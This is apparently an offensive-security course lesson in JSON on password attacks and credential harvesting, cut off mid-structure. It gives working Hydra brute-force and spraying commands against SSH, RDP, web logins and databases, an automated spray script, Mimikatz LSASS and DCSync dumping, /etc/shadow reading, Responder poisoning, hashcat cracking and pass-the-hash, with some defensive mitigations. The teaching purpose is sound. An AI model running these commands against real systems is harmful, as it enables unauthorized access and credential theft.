{
  "lesson_id": "5915f692-0956-4f5c-a187-f461e6972217",
  "domain": "red_team",
  "title": "Password Attacks & Credential Harvesting",
  "subtitle": "Attacking authentication, cracking hashes, and harvesting credentials",
  "difficulty": 2,
  "estimated_time": 50,
  "order_index": 7,
  "prerequisites": [],
  "concepts": [
    "Password Cracking",
    "Hash Cracking",
    "Credential Harvesting",
    "Pass-the-Hash",
    "Mimikatz",
    "Hydra",
    "Hashcat",
    "John the Ripper"
  ],
  "learning_objectives": [
    "Understand different password attack techniques and when to use each",
    "Master hash cracking with Hashcat and John the Ripper",
    "Learn credential harvesting techniques on Windows and Linux",
    "Perform Pass-the-Hash and Pass-the-Ticket attacks"
  ],
  "content_blocks": [
    {
      "block_id": "f1e2d3c4-b5a6-4978-8e9f-0a1b2c3d4e5f",
      "type": "mindset_coach",
      "title": "The Art of Password Attacks",
      "content": {
        "text": "**Welcome to password attacks - the gateway to privilege escalation!**\n\nYou're about to learn one of the most critical skills in offensive security. Passwords are still the #1 authentication method, which makes them the #1 target for attackers.\n\n**Here's the truth**: In 2023, 81% of data breaches involved stolen or weak passwords (Verizon DBIR). Despite decades of security awareness, users still choose \"Password123!\" and reuse credentials across services.\n\n**The Jim Kwik principle at work**: We'll use ACTIVE LEARNING - you won't just read about password cracking, you'll see real attack outputs and learn to recognize weak passwords instantly. We'll GAMIFY IT - watching a hash crack is oddly satisfying.\n\n**Why this matters**: The 2020 SolarWinds breach began with a compromised password. The 2021 Colonial Pipeline ransomware attack started with a leaked VPN password. Your ability to attack, crack, and defend against password attacks directly impacts an organization's security posture.\n\n**Your goal for this lesson**: Master password attacks so thoroughly that you can assess password security, crack hashes efficiently, and understand how attackers harvest credentials - then use that knowledge to defend better.\n\n**Think like an attacker, defend like a champion**: Every technique you learn here has a defensive counterpart. As you study each attack, ask yourself: \"How would I detect this? How would I prevent it?\""
      }
    },
    {
      "block_id": "a2b3c4d5-e6f7-4a89-9b0c-1d2e3f4a5b6c",
      "type": "explanation",
      "title": "Password Attack Taxonomy: Understanding the Complete Arsenal",
      "content": {
        "text": "## Understanding Password Attacks\n\nPassword attacks fall into several categories, each with specific use cases and trade-offs. Let's break down the complete taxonomy:\n\n### 1. Online Password Attacks\n\n**Definition**: Attacking authentication services directly over the network (SSH, RDP, web login forms, APIs)\n\n**Characteristics**:\n- ✅ Tests real credentials against live service\n- ✅ Immediate access if successful\n- ✅ No need to obtain password hashes first\n- ❌ Slow (network latency, rate limiting, server processing)\n- ❌ Easily detected (logs, IDS, SIEM alerts, account lockouts)\n- ❌ Risk of account lockout after failed attempts\n- ❌ Legal implications if unauthorized\n\n**Tools**: Hydra, Medusa, CrackMapExec, Metasploit auxiliary modules, Burp Suite Intruder, Patator\n\n**Attack Subtypes**:\n\n**1a. Brute Force**: Try all possible character combinations\n```\nExample: a, aa, ab, ac... zzz, zzzz\nPros: Guaranteed success given enough time\nCons: Exponentially slow (8-char = 218 trillion combinations)\nBest for: Short passwords (4-6 characters), numeric PINs\n```\n\n**1b. Dictionary Attack**: Try words from a wordlist\n```\nExample: password, 123456, admin, letmein, welcome\nPros: Fast, targets common passwords\nCons: Fails against complex passwords\nBest for: Initial reconnaissance, weak password policies\n```\n\n**1c. Password Spraying**: Try one password against many accounts\n```\nExample: Try \"Password123!\" against 1000 users\nPros: Avoids account lockout\nCons: Lower success rate per attempt\nBest for: Active Directory, Office 365, enterprise environments\n```\n\n**1d. Credential Stuffing**: Use breached credentials from other services\n```\nExample: Try credentials from LinkedIn breach against company VPN\nPros: High success rate (password reuse is common)\nCons: Requires obtaining breach data first\nBest for: External services, consumer applications\n```\n\n**When to use online attacks**: \n- You don't have password hashes\n- Testing specific accounts or services\n- Services without rate limiting or monitoring\n- After discovering valid usernames (enumerate first, attack second)\n- During penetration tests with proper authorization\n\n**Real-world example**: In 2020, attackers compromised Citrix VPN by spraying \"Password123!\" across 5,000 employee accounts. Only took 3 successful attempts to gain initial access.\n\n### 2. Offline Password Attacks (Hash Cracking)\n\n**Definition**: Cracking password hashes obtained from database dumps, memory, file systems, or network captures\n\n**Characteristics**:\n- ✅ Very fast (millions to billions of attempts per second with GPU)\n- ✅ No detection risk (completely offline)\n- ✅ No account lockout\n- ✅ Can pause and resume at will\n- ❌ Requires hash acquisition first (higher privilege needed)\n- ❌ Strong hashes take time (bcrypt, scrypt, Argon2)\n- ❌ Salted hashes require per-hash cracking (no rainbow tables)\n\n**Tools**: Hashcat (GPU-based, fastest), John the Ripper (CPU-based, versatile), Ophcrack (rainbow tables), hashID (hash identification)\n\n**Common Hash Types You'll Encounter**:\n\n```\nMD5:        32 hex characters (unsalted, very fast to crack)\nSHA-1:      40 hex characters (unsalted, fast to crack)\nNTLM:       32 hex characters (Windows, unsalted, VERY fast)\nSHA-256:    64 hex characters (salted variants slower)\nSHA-512:    128 hex characters (Linux/Unix, salted)\nbcrypt:     60 characters starting with $2a$, $2b$, or $2y$ (slow by design)\nscrypt:     Variable length, starts with $scrypt$ (memory-hard)\nArgon2:     Variable length, starts with $argon2 (modern, very secure)\n```\n\n**Cracking Speed Comparison** (NVIDIA RTX 4090, approximate):\n\n```\nHash Type       Speed               Time to crack 8-char random\n----------------------------------------------------------------\nMD5             200 GH/s            ~5 hours\nSHA-1           70 GH/s             ~14 hours  \nNTLM            240 GH/s            ~4 hours\nSHA-256         4 GH/s              ~30 days\nbcrypt (cost 12) 100 KH/s           ~100 years\nscrypt          10 KH/s             ~1000 years\n```\n\n**When to use offline attacks**:\n- After dumping SAM/NTDS.dit from Windows systems\n- Found hashes in database breach or SQL injection\n- Extracted from memory with Mimikatz\n- Captured NetNTLMv2 hashes from network (Responder)\n- Found in configuration files or scripts\n- Password-protected files (ZIP, PDF, Office documents)\n\n**Real-world example**: In the 2012 LinkedIn breach, 6.5 million unsalted SHA-1 hashes were stolen. Security researchers cracked 90% of them within days.\n\n### 3. Pass-the-Hash (PtH) Attacks\n\n**Definition**: Using password hashes directly for authentication without cracking them to plaintext\n\n**Characteristics**:\n- ✅ No cracking needed (save time and resources)\n- ✅ Works even with strong passwords (complexity doesn't matter)\n- ✅ Fast lateral movement across Windows networks\n- ✅ Bypasses password complexity requirements\n- ❌ Only works with NTLM authentication (Windows-specific)\n- ❌ Requires local admin or SYSTEM privileges to extract hashes\n- ❌ Doesn't work with Kerberos (need Pass-the-Ticket instead)\n- ❌ Fails if NTLM is disabled (Kerberos-only environments)\n\n**Tools**: Mimikatz (sekurlsa::pth), CrackMapExec (--local-auth -H), Impacket (psexec.py -hashes), Metasploit (psexec module)\n\n**How PtH Works**:\n\n```\nNormal Authentication:\nUser enters password → System hashes password → Compares hash to stored hash\n\nPass-the-Hash:\nAttacker provides hash directly → System accepts hash → Authentication succeeds\n\nWhy it works: NTLM protocol authenticates with the hash, not the password\n```\n\n**When to use Pass-the-Hash**:\n- Windows environments with NTLM enabled (most enterprises)\n- You have NTLM hashes but can't crack them (strong passwords)\n- Need immediate lateral movement (no time to crack)\n- Password is too complex to crack in reasonable time\n- Testing lateral movement capabilities during pentests\n\n**Real-world example**: In the 2014 Sony Pictures breach, attackers used Pass-the-Hash to move from workstations to domain controllers within hours, even though admin passwords were 15+ characters.\n\n### 4. Credential Harvesting\n\n**Definition**: Extracting plaintext credentials from memory, files, configuration, browser storage, or network traffic\n\n**Characteristics**:\n- ✅ Gets plaintext passwords (no cracking needed)\n- ✅ No brute force or guessing required\n- ✅ Often finds service account passwords (high-value targets)\n- ✅ Multiple methods available (memory, files, network, phishing)\n- ❌ Requires system access first (initial foothold)\n- ❌ May require elevated privileges (SYSTEM for LSASS)\n- ❌ Credentials may be encrypted (need to decrypt)\n- ❌ Some methods trigger AV/EDR alerts\n\n**Tools**: Mimikatz (LSASS dumping), LaZagne (browser/app passwords), Responder (network capture), Inveigh (LLMNR/NBT-NS poisoning), PCredz (PCAP parsing)\n\n**Harvesting Sources**:\n\n**4a. Memory Dumping**:\n```\nTarget: LSASS.exe process (Local Security Authority Subsystem Service)\nContains: Plaintext passwords (if WDigest enabled), NTLM hashes, Kerberos tickets\nRequires: SYSTEM or SeDebugPrivilege\nTool: Mimikatz sekurlsa::logonpasswords\n```\n\n**4b. Browser Passwords**:\n```\nTarget: Chrome (Login Data), Firefox (logins.json), Edge (Login Data)\nContains: Saved website credentials\nRequires: User context or local admin\nTool: LaZagne.exe browsers, Mimikatz dpapi\n```\n\n**4c. Network Capture**:\n```\nTarget: LLMNR/NBT-NS/mDNS broadcast authentication\nContains: NetNTLMv2 challenge-response hashes\nRequires: Network access\nTool: Responder -I eth0 -wrf\n```\n\n**4d. File and Registry**:\n```\nTarget: Configuration files, scripts, registry (Putty sessions, WinSCP, FileZilla)\nContains: Plaintext or encrypted passwords\nRequires: File system access\nTool: grep, findstr, reg query\n```\n\n**When to use credential harvesting**:\n- After gaining initial foothold on a system\n- Privilege escalation attempts\n- Finding credentials for lateral movement\n- Discovering service account passwords\n- Post-exploitation during pentests\n\n**Real-world example**: In 2023, attackers harvested Citrix credentials from memory using a custom Mimikatz variant, discovering a domain admin password stored in plaintext. This led to full domain compromise within 48 hours.\n\n## Attack Flow Decision Tree\n\nHere's how to choose the right attack:\n\n```\n┌──────────────────────────────────────────┐\n│   Do you have system access?             │\n└──────────────┬───────────────────────────┘\n│\n├─NO──→ Online Password Attacks\n│      │\n│      ├─ Have usernames? → Password Spray\n│      ├─ No usernames? → Enumerate first (OSINT, LDAP, SMB)\n│      ├─ Weak security? → Brute force with Hydra\n│      └─ Found breach? → Credential Stuffing\n│\n└─YES──→ Do you have hashes?\n│\n├─YES──→ What hash type?\n│      │\n│      ├─ Windows NTLM? → Pass-the-Hash (skip cracking!)\n│      ├─ NetNTLMv2? → Crack offline with Hashcat\n│      ├─ bcrypt/scrypt? → Crack if password policy weak, else move on\n│      ├─ MD5/SHA-1? → Crack immediately (very fast)\n│      └─ Salted SHA-256/512? → Crack with wordlist + rules\n│\n└─NO──→ Credential Harvesting\n│\n├─ Have admin? → Dump LSASS with Mimikatz\n├─ User context? → Extract browser passwords with LaZagne\n├─ Network access? → Capture credentials with Responder\n└─ File access? → Search scripts, config files, registry\n```\n\n## Password Attack Methodology (Step-by-Step)\n\nFollow this methodology for comprehensive password attacks:\n\n**Phase 1: Reconnaissance (Pre-Attack Intelligence)**\n\n```bash\n# Identify authentication methods\nnmap -p 22,23,139,445,3389,5985,5986 -sV 192.168.1.0/24\n\n# Enumerate valid usernames\nenum4linux -U 192.168.1.100  # SMB enumeration\nldapsearch -x -H ldap://192.168.1.100 -b \"dc=company,dc=com\" \"(objectClass=user)\" samaccountname\n\n# Check password policy (avoid lockouts!)\nenum4linux -P 192.168.1.100\ncrackmapexec smb 192.168.1.100 --pass-pol\n\n# Identify hash types in use\n# Windows: NTLM (LM deprecated)\n# Linux: SHA-512 (check /etc/shadow)\n# Web apps: varies (MD5, bcrypt, SHA-256)\n```\n\n**Phase 2: Initial Access (Getting First Credentials)**\n\n```bash\n# Try default credentials first\ncrackmapexec smb 192.168.1.0/24 -u administrator -p admin\ncrackmapexec ssh 192.168.1.0/24 -u root -p root\n\n# Check common passwords\nhydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100\n\n# Password spray (safe - avoids lockout)\ncrackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123!' --continue-on-success\n\n# Search for credential leaks\ngh-dorks -r company-name -w passwords\ntrufflehog --regex git clone https://github.com/company/repo\n```\n\n**Phase 3: Credential Access (Post-Compromise Harvesting)**\n\n```bash\n# Dump password hashes (Windows)\nmimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords  # Plaintext passwords\nmimikatz # lsadump::sam               # Local account hashes\nmimikatz # lsadump::secrets           # Cached passwords\n\n# Dump password hashes (Linux)\nsudo cat /etc/shadow\nsudo unshadow /etc/passwd /etc/shadow > hashes.txt\n\n# Extract from memory\nprocdump64.exe -ma lsass.exe lsass.dmp  # On target\nmimikatz # sekurlsa::minidump lsass.dmp # Offline analysis\n\n# Search files and scripts\nfindstr /spin \"password\" *.txt *.config *.xml *.ini\ngrep -r \"password\" /home /var/www /opt 2>/dev/null\n\n# Capture network authentication (LLMNR poisoning)\nresponder -I eth0 -wrf\n# Wait for users to mistype server names → Capture NetNTLMv2 hashes\n```\n\n**Phase 4: Credential Cracking (Offline Hash Cracking)**\n\n```bash\n# Identify hash type\nhashcat --example-hashes | grep -i ntlm\nhashid '$2y$10$N9qo8uLOickgx2ZMRZoMyeIjZ...'\n\n# Crack with wordlist\nhashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt\n\n# Crack with rules (mutations)\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule\n\n# Mask attack (if you know password pattern)\nhashcat -m 1000 -a 3 ntlm.txt ?u?l?l?l?l?l?d?d  # Pssword12\n\n# Show cracked passwords\nhashcat -m 1000 --show ntlm.txt\n```\n\n**Phase 5: Lateral Movement (Using Obtained Credentials)**\n\n```bash\n# Test credentials across network\ncrackmapexec smb 192.168.1.0/24 -u admin -p 'Cracked123!'\n\n# Pass-the-Hash (if NTLM hash)\ncrackmapexec smb 192.168.1.0/24 -u admin -H 'aad3b435...8846f7ea...'\n\n# Spray credentials\nfor ip in $(cat targets.txt); do\ncrackmapexec smb $ip -u admin -p 'Cracked123!' --continue-on-success\ndone\n\n# Escalate to Domain Admin (if possible)\nmimikatz # lsadump::dcsync /user:Administrator  # DCSync attack\n```\n\n**Memory Aid - Attack Methodology Acronym**: \n\n**\"RICCL\"** (pronounce \"rickle\") = **R**econ, **I**nitial, **C**redential, **C**racking, **L**ateral\n\n1. **R**econ: Enumerate users, identify services, check password policy\n2. **I**nitial: Default credentials, password spray, common passwords\n3. **C**redential: Dump hashes, search files, capture network auth\n4. **C**racking: Hashcat/John, wordlists + rules, mask attacks\n5. **L**ateral: Test credentials, Pass-the-Hash, escalate privileges\n\nThis methodology ensures you don't miss opportunities and provides a clear progression from external reconnaissance to domain compromise."
      }
    },
    {
      "block_id": "b3c4d5e6-f7a8-4b90-9c0d-1e2f3a4b5c6d",
      "type": "code_exercise",
      "title": "Hands-On: Online Password Attacks with Hydra",
      "content": {
        "text": "## What is Hydra?\n\n**Hydra** (THC-Hydra) is a parallelized network authentication cracker supporting 50+ protocols. It's the Swiss Army knife of online password attacks.\n\n**Supported protocols**: SSH, RDP, FTP, HTTP(S), SMB, MSSQL, MySQL, PostgreSQL, VNC, SMTP, POP3, IMAP, Telnet, LDAP, and more.\n\n## Basic Hydra Syntax\n\n```bash\nhydra [options] [protocol://]target [module options]\n```\n\n**Key flags**:\n- `-l USERNAME` : Single username\n- `-L FILE` : Username wordlist file\n- `-p PASSWORD` : Single password\n- `-P FILE` : Password wordlist file\n- `-t THREADS` : Number of parallel threads (default 16, max 64)\n- `-s PORT` : Port number (if non-default)\n- `-f` : Stop after first successful login found\n- `-F` : Stop entire scan after any success\n- `-V` : Verbose (show all attempts)\n- `-v` : Verbose (show login attempts)\n- `-o FILE` : Output successful attempts to file\n- `-w TIMEOUT` : Wait time between connection attempts\n- `-W TIME` : Response timeout\n\n## SSH Brute Force Attacks\n\n### Basic SSH Attack\n\n```bash\n# Single user, password wordlist\nhydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100\n\n# Multiple users, password wordlist\nhydra -L users.txt -P passwords.txt ssh://192.168.1.100\n\n# Single user, single password (quick test)\nhydra -l admin -p password123 ssh://192.168.1.100\n\n# SSH on non-standard port\nhydra -l root -P rockyou.txt ssh://192.168.1.100 -s 2222\n\n# Faster with more threads (use carefully!)\nhydra -l root -P rockyou.txt ssh://192.168.1.100 -t 4\n\n# Stop after first success\nhydra -l root -P rockyou.txt ssh://192.168.1.100 -f\n\n# Save results to file\nhydra -l root -P rockyou.txt ssh://192.168.1.100 -o ssh-results.txt\n\n# Verbose output (see all attempts)\nhydra -l root -P rockyou.txt ssh://192.168.1.100 -V\n```\n\n**Output when successful**:\n```\n[22][ssh] host: 192.168.1.100   login: root   password: password123\n[STATUS] attack finished for 192.168.1.100 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\n```\n\n**SSH Attack Tips**:\n\n```bash\n# Create a custom username list for target\necho -e \"root\\nadmin\\nadministrator\\nubuntu\\ndebian\" > ssh_users.txt\n\n# Use smaller wordlist first (faster triage)\nhydra -L ssh_users.txt -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt ssh://192.168.1.100\n\n# If no success, move to larger wordlist\nhydra -L ssh_users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100 -t 4\n```\n\n### Advanced SSH Attack with Custom Wordlist\n\n```bash\n# Generate custom wordlist based on company name\ncewl https://company.com -m 6 -d 2 -w company_wordlist.txt\n\n# Add common password patterns\ncat << EOF >> company_wordlist.txt\nPassword123!\nCompany2024!\nWelcome123\nAdmin@123\nSummer2024!\nEOF\n\n# Attack with custom wordlist\nhydra -L users.txt -P company_wordlist.txt ssh://192.168.1.100 -f\n```\n\n## RDP (Remote Desktop Protocol) Attacks\n\n```bash\n# Basic RDP attack (port 3389)\nhydra -l administrator -P passwords.txt rdp://192.168.1.100\n\n# Multiple users\nhydra -L users.txt -P passwords.txt rdp://192.168.1.100\n\n# With verbose output\nhydra -l administrator -P passwords.txt rdp://192.168.1.100 -V\n\n# Custom RDP port\nhydra -l administrator -P passwords.txt rdp://192.168.1.100 -s 3390\n```\n\n**Important**: RDP is often slow and may have account lockout policies. Use cautiously!\n\n**Better RDP strategy**:\n```bash\n# First, check if RDP is open and enumerate users\nnmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info 192.168.1.100\n\n# Then spray ONE password against discovered users\nhydra -L discovered_users.txt -p 'Password123!' rdp://192.168.1.100\n```\n\n## HTTP/HTTPS POST Form Attacks (Web Login Pages)\n\nWeb login forms are extremely common. Here's how to attack them:\n\n### Step 1: Capture the Login Request\n\nUse Burp Suite or browser dev tools:\n\n1. Open browser dev tools (F12)\n2. Go to Network tab\n3. Submit login form with test credentials\n4. Find the POST request\n5. Note:\n- POST URL (e.g., `/login.php`)\n- Parameter names (e.g., `username`, `password`)\n- Failure message (e.g., \"Invalid credentials\")\n\n**Example captured request**:\n```http\nPOST /login.php HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=test123&submit=Login\n```\n\n**Response for failed login**:\n```html\nHTTP/1.1 200 OK\n<html>...<div class=\"error\">Invalid username or password</div>...</html>\n```\n\n### Step 2: Craft Hydra Command\n\n```bash\nhydra -l admin -P passwords.txt example.com http-post-form \"/login.php:username=^USER^&password=^PASS^&submit=Login:Invalid username\"\n```\n\n**Syntax breakdown**:\n```\nhttp-post-form \"<path>:<parameters>:<failure_string>\"\n\n<path>             = /login.php\n<parameters>       = username=^USER^&password=^PASS^&submit=Login\n<failure_string>   = Invalid username (text that appears when login FAILS)\n\nPlaceholders:\n^USER^  = Hydra replaces with username from -l or -L\n^PASS^  = Hydra replaces with password from -p or -P\n```\n\n### HTTP Form Attack Examples\n\n```bash\n# Basic web form attack\nhydra -l admin -P rockyou.txt example.com http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\"\n\n# With specific failure string\nhydra -L users.txt -P passwords.txt example.com http-post-form \"/admin/login.php:username=^USER^&password=^PASS^:F=Login failed\"\n\n# HTTPS (SSL) form\nhydra -l admin -P passwords.txt example.com https-post-form \"/login:username=^USER^&password=^PASS^:F=Invalid\"\n\n# With cookies (for session handling)\nhydra -l admin -P passwords.txt example.com http-post-form \"/login:username=^USER^&password=^PASS^:F=Wrong:H=Cookie: PHPSESSID=abc123\"\n\n# With custom User-Agent\nhydra -l admin -P passwords.txt example.com http-post-form \"/login:username=^USER^&password=^PASS^:F=Error:H=User-Agent: Mozilla/5.0\"\n\n# Multiple form parameters\nhydra -l admin -P passwords.txt example.com http-post-form \"/login:username=^USER^&password=^PASS^&submit=Login&remember=yes:F=Invalid\"\n```\n\n### Using Success String Instead of Failure String\n\nSometimes it's easier to specify what appears when login SUCCEEDS:\n\n```bash\n# S= for success string instead of F= for failure\nhydra -l admin -P passwords.txt example.com http-post-form \"/login:username=^USER^&password=^PASS^:S=Welcome\"\n\n# Success string: \"Welcome\" appears on successful login dashboard\n```\n\n### HTTP GET Form Attacks\n\nSome login forms use GET instead of POST:\n\n```bash\n# GET form (parameters in URL)\nhydra -l admin -P passwords.txt example.com http-get-form \"/login.php:username=^USER^&password=^PASS^:F=Invalid\"\n\n# Example URL: http://example.com/login.php?username=admin&password=test123\n```\n\n### HTTP Basic Authentication\n\n```bash\n# HTTP Basic Auth (dialog box)\nhydra -l admin -P passwords.txt example.com http-get /admin/\n\n# HTTPS Basic Auth\nhydra -l admin -P passwords.txt example.com https-get /admin/\n```\n\n## SMB/Windows Login Attack\n\n```bash\n# SMB brute force\nhydra -l administrator -P passwords.txt smb://192.168.1.100\n\n# Multiple users\nhydra -L users.txt -P passwords.txt smb://192.168.1.100\n\n# Domain user format\nhydra -l 'DOMAIN\\admin' -P passwords.txt smb://192.168.1.100\n\n# Save successful attempts\nhydra -L users.txt -P passwords.txt smb://192.168.1.100 -o smb_creds.txt\n```\n\n**Alternative: CrackMapExec (Better for SMB)**:\n\n```bash\n# CrackMapExec is more efficient for SMB\ncrackmapexec smb 192.168.1.100 -u admin -p passwords.txt\n\n# Password spray across subnet\ncrackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123!' --continue-on-success\n```\n\n## FTP Brute Force\n\n```bash\n# FTP attack\nhydra -l admin -P passwords.txt ftp://192.168.1.100\n\n# Test for anonymous FTP first\nhydra -l anonymous -p \"\" ftp://192.168.1.100\n\n# Common FTP users\necho -e \"admin\\nftp\\nftpuser\\nroot\" > ftp_users.txt\nhydra -L ftp_users.txt -P passwords.txt ftp://192.168.1.100\n```\n\n## MySQL Database Attack\n\n```bash\n# MySQL brute force\nhydra -l root -P passwords.txt mysql://192.168.1.100\n\n# Custom port\nhydra -l root -P passwords.txt mysql://192.168.1.100 -s 3307\n\n# Multiple database users\necho -e \"root\\nadmin\\nmysql\\ndbuser\" > db_users.txt\nhydra -L db_users.txt -P passwords.txt mysql://192.168.1.100\n```\n\n## PostgreSQL Database Attack\n\n```bash\n# PostgreSQL brute force\nhydra -l postgres -P passwords.txt postgres://192.168.1.100\n\n# With specific database name\nhydra -l postgres -P passwords.txt postgres://192.168.1.100/mydatabase\n```\n\n## Password Spraying (Avoid Lockout)\n\n**Problem**: Traditional brute force tries many passwords per user → Account lockout\n\n**Solution**: Password spraying tries ONE password against MANY users → No lockout\n\n**Scenario**: You enumerated 100 usernames. Password policy allows 3 failed attempts before 30-minute lockout.\n\n### Wrong Approach (Gets Locked Out)\n\n```bash\n# BAD: Tries entire wordlist against one user\n# Will lockout after 3 attempts!\nhydra -l admin -P rockyou.txt ssh://target.com\n```\n\n### Right Approach (Password Spray)\n\n```bash\n# GOOD: Try ONE password against ALL users\nhydra -L users.txt -p 'Password123!' ssh://target.com -o spray_results.txt\n\n# Wait 30 minutes (lockout reset)\nsleep 1800\n\n# Try next password\nhydra -L users.txt -p 'Welcome2024!' ssh://target.com -o spray_results.txt\n\n# Wait again\nsleep 1800\n\n# Try third password\nhydra -L users.txt -p 'Summer2024!' ssh://target.com -o spray_results.txt\n```\n\n### Automated Password Spray Script\n\n```bash\n#!/bin/bash\n# password_spray.sh - Automated password spraying\n\nUSERS=\"users.txt\"\nPASSWORDS=\"spray_passwords.txt\"  # File with ~10 common passwords\nTARGET=\"ssh://192.168.1.100\"\nLOCKOUT_WAIT=1800  # 30 minutes\n\nwhile IFS= read -r password; do\necho \"[*] Trying password: $password\"\nhydra -L \"$USERS\" -p \"$password\" \"$TARGET\" -o spray_results.txt\necho \"[*] Waiting $LOCKOUT_WAIT seconds before next attempt...\"\nsleep $LOCKOUT_WAIT\ndone < \"$PASSWORDS\"\n\necho \"[+] Password spray complete. Check spray_results.txt for results.\"\n```\n\n### Creating a Spray Password List\n\n```bash\n# Common passwords for spraying (adjust for target org)\ncat << EOF > spray_passwords.txt\nPassword123!\nWelcome2024!\nCompany2024!\nSummer2024!\nWinter2024!\nAdmin@123\nP@ssw0rd\nChangeme123!\nTemporary123!\n<CompanyName>2024!\nEOF\n```\n\n### Better Tools for Password Spraying\n\n**For Active Directory / Windows**:\n\n```bash\n# CrackMapExec (better for domain environments)\ncrackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123!' --continue-on-success\n\n# DomainPasswordSpray (PowerShell)\nImport-Module .\\DomainPasswordSpray.ps1\nInvoke-DomainPasswordSpray -UserList users.txt -Password 'Password123!' -Domain example.com\n\n# Spray (Go tool)\nspray smb -u users.txt -p 'Password123!' 192.168.1.0/24\n```\n\n## Hydra Performance Tuning\n\n### Speed Settings\n\n```bash\n# Slow and stealthy (1 thread, 3 second delays)\nhydra -l admin -P passwords.txt ssh://target.com -t 1 -w 3\n\n# Normal speed (default: 16 threads)\nhydra -l admin -P passwords.txt ssh://target.com\n\n# Fast (32 threads)\nhydra -l admin -P passwords.txt ssh://target.com -t 32\n\n# Very fast (64 threads - max recommended)\nhydra -l admin -P passwords.txt ssh://target.com -t 64\n\n# Insane (not recommended - may crash service)\nhydra -l admin -P passwords.txt ssh://target.com -t 128\n```\n\n**Choosing thread count**:\n```\n1-4 threads:   Stealthy, slow, less likely to trigger IDS\n16 threads:    Default, balanced\n32-64 threads: Fast, may trigger rate limiting\n64+ threads:   Very fast, high risk of detection/service disruption\n```\n\n### Session Management (Resume Attacks)\n\n```bash\n# Save session state\nhydra -l admin -P rockyou.txt ssh://target.com -o results.txt\n# If interrupted (Ctrl+C), session saved to hydra.restore\n\n# Resume interrupted attack\nhydra -R\n# Reads from hydra.restore and continues where it left off\n```\n\n## Common Wordlists\n\n### Built-in Wordlists (Kali Linux)\n\n```bash\n# RockYou (14 million passwords from 2009 breach)\n/usr/share/wordlists/rockyou.txt\n\n# SecLists (comprehensive collection)\n/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt\n/usr/share/seclists/Passwords/Common-Credentials/best1050.txt\n/usr/share/seclists/Passwords/darkweb2017-top10000.txt\n/usr/share/seclists/Passwords/xato-net-10-million-passwords.txt\n\n# Default credentials\n/usr/share/seclists/Passwords/Default-Credentials/\n\n# Usernames\n/usr/share/seclists/Usernames/top-usernames-shortlist.txt\n/usr/share/seclists/Usernames/Names/names.txt\n```\n\n### Wordlist Optimization\n\n```bash\n# Extract first 1000 lines (faster triage)\nhead -n 1000 /usr/share/wordlists/rockyou.txt > top1000.txt\nhydra -l admin -P top1000.txt ssh://target.com\n\n# Remove duplicates\nsort passwords.txt | uniq > passwords_unique.txt\n\n# Filter by length (8-16 characters)\nawk 'length($0) >= 8 && length($0) <= 16' rockyou.txt > rockyou_8-16.txt\n\n# Combine multiple wordlists\ncat wordlist1.txt wordlist2.txt | sort | uniq > combined.txt\n```\n\n## Real-World Attack Example\n\n**Scenario**: Penetration test against company web portal at https://portal.example.com/login\n\n**Step 1: Reconnaissance**\n\n```bash\n# Enumerate usernames from OSINT\ntheHarvester -d example.com -b all -l 500\n# Found: sales@example.com, admin@example.com, support@example.com\n\n# Save to file\ncat << EOF > users.txt\nsales@example.com\nadmin@example.com\nsupport@example.com\nEOF\n```\n\n**Step 2: Check Password Policy**\n\n```bash\n# Try logging in with bad password multiple times to test lockout\n# Result: 3 failed attempts = 30 minute lockout\n# Conclusion: Must use password spraying\n```\n\n**Step 3: Capture Login Request**\n\nUsing Burp Suite:\n```http\nPOST /login HTTP/1.1\nHost: portal.example.com\nContent-Type: application/x-www-form-urlencoded\n\nemail=admin@example.com&password=test&submit=Login\n```\n\nFailed login response contains: \"Invalid credentials\"\n\n**Step 4: Password Spray**\n\n```bash\n# Create spray password list\ncat << EOF > spray.txt\nPassword123!\nWelcome2024!\nExample2024!\nSummer2024!\nPortal123!\nEOF\n\n# Spray first password\nhydra -L users.txt -p 'Password123!' portal.example.com https-post-form \"/login:email=^USER^&password=^PASS^&submit=Login:F=Invalid credentials\" -o results.txt\n\n# Wait 30 minutes (lockout reset)\nsleep 1800\n\n# Spray second password\nhydra -L users.txt -p 'Welcome2024!' portal.example.com https-post-form \"/login:email=^USER^&password=^PASS^&submit=Login:F=Invalid credentials\" -o results.txt\n```\n\n**Step 5: Success!**\n\n```\n[443][https-post-form] host: portal.example.com   login: admin@example.com   password: Welcome2024!\n```\n\n**Step 6: Report Finding**\n\nDocument in pentest report:\n- Weak password policy (common password accepted)\n- Successful password spray attack\n- Recommendation: Enforce stronger password complexity, implement MFA\n\n## Defensive Mitigations\n\nAs you learn to attack, always think about defense:\n\n**Prevention**:\n```\n✓ Strong password policy (12+ characters, complexity requirements)\n✓ Multi-factor authentication (MFA/2FA)\n✓ Account lockout policy (5 failures = 30 min lockout)\n✓ Rate limiting (max 10 requests per minute per IP)\n✓ CAPTCHA after 3 failed attempts\n✓ Ban common passwords (use zxcvbn or similar)\n```\n\n**Detection**:\n```\n✓ Monitor for multiple failed login attempts from same IP\n✓ Alert on password spray patterns (1 attempt per user)\n✓ Log all authentication attempts (success and failure)\n✓ Correlate login attempts across multiple users\n✓ Detect impossible travel (login from US, then China 5 min later)\n```\n\n**Response**:\n```\n✓ Automatically block IPs with >10 failed attempts\n✓ Notify users of suspicious login attempts\n✓ Require password reset for compromised accounts\n✓ Force MFA enrollment after suspicious activity\n```\n\nRemember: Every attack technique has a defensive counterpart. Learn both sides to become a complete security professional."
      }
    },
    {
      "block_id": "c4d5e6f7-a8b9-4c01-9d0e-1f2a3b4c5d6e",
      "type": "code_exercise",
      "title": "Hash Cracking Mastery with Hashcat and John the Ripper",
      "content": {
